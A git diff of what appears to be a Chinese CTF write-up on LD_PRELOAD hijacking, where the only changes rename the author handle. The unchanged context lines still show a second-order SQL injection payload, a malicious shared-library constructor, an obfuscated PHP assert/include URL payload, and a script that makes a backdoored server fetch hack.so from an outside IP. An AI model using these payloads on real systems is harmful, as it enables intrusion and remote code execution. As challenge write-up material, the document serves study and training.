@@ -1,6 +1,6 @@
 ---
 title: LD_PRELOAD劫持类型题目
-author: ch3n9w
+author: ch4ser
 date: 2019-12-26 16:37:19
 typora-root-url: ../
 categories:
@@ -53,7 +53,7 @@ if(isset($_POST['title']) && isset($_POST['content']) && isset($_POST['id'])){
 这里存在一处二次注入, 将原来的文章选出来后将他的title不经过addslashes直接拼接进了update语句中.
 
 ```
-update users set isvip=1 where username='ch3n9w'
+update users set isvip=1 where username='ch4ser'
 
 ';set @a=0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d2763683473657227;prepare kk from @a;execute kk;'
 ```
@@ -187,7 +187,7 @@ hack.c
 
 __attribute__ ((__constructor__)) void angel (void){
     unsetenv("LD_PRELOAD");
-    system("/readflag > /tmp/ch3n9w");
+    system("/readflag > /tmp/ch4ser");
 }
 ```
 
@@ -199,7 +199,7 @@ gcc -shared -fPIC hack.c -o hack.so
 
 拖上去就行了
 
-ch3n9w.php
+ch4ser.php
 
 ```
 <?php
@@ -212,7 +212,7 @@ ch3n9w.php
 最后包含代码去执行
 
 ```php
-http://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=assert&__=include("/tmp/ch3n9w.php")
+http://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=assert&__=include("/tmp/ch4ser.php")
 ```
 
 ``mail``函数产生进程的同时就会触发preload中的代码, 然后读输出中的flag就行了
@@ -245,9 +245,9 @@ $dir = "{0}";
 file_put_contents("{0}/hack.so",file_get_contents("http://207.148.64.125:80/hack.so"));
 chmod("{0}/hack.so",0777);
 putenv("LD_PRELOAD={0}/hack.so");
-file_put_contents("{0}/ch3n9w.wmv","sssss");
-file_put_contents("{0}/ch3n9w","");
-$tocken = new Imagick('{0}/ch3n9w.wmv');
+file_put_contents("{0}/ch4ser.wmv","sssss");
+file_put_contents("{0}/ch4ser","");
+$tocken = new Imagick('{0}/ch4ser.wmv');
 ?>
 </pre>
 '''.format(dir)
@@ -261,7 +261,7 @@ include "%s/evil";
 print(requests.post(url, data={'backdoor': payload }).content)
 
 print requests.post(url,data={'backdoor':"print_r(scandir('%s'));"%dir}).content
-print requests.post(url,data={'backdoor':"echo file_get_contents('%s/ch3n9w');"%dir}).content
+print requests.post(url,data={'backdoor':"echo file_get_contents('%s/ch4ser');"%dir}).content
 ```
 
 脚本写得很烂，注释部分可以忽略，是我在写的过程中遇到的小问题。
@@ -272,7 +272,7 @@ print requests.post(url,data={'backdoor':"echo file_get_contents('%s/ch3n9w');"%
 #include <stdlib.h>
 #include <stdio.h>
 __attribute__ ((__constructor__)) void angel (void){
-    system("/readflag > /tmp/ch3n9w");
+    system("/readflag > /tmp/ch4ser");
 }
 ```
 
